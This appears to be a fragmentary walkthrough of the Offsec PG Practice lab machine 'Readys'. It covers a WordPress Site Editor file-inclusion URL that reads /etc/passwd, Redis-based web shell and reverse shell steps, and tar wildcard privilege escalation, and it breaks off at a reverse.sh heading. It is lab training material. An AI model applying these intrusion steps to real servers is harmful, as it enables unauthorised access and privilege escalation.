###### tags: `Offsec` `PG Practice` `Intermediate` `Linux` # Readys
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check`http://192.168.172.166`,wordpress,use`wpscan`
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Search`site-editor 1.1.1`,[edb-44340](https://www.exploit-db.com/exploits/44340)
```
** Proof of Concept **
...
``` Go to `http://192.168.172.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`
```
...
``` `redis-rce`,tryCheck`/etc/redis/redis.conf`,to see`Ready4Redis?`
```
...
redis
``` find,Checkcandirectory,tryshell.php`/run/redis`Go to `/run/redis/shell.php`get reverse
```
...
``` `alice`,`/home/alice`get local.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
alice@readys:/$ whoami
alice
...
``` `/var/www/html`[Wildcard Injection](https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807)[Linux Privilege Escalation: Wildcards with tar](https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa),cronjobRun
```
# reverse.sh
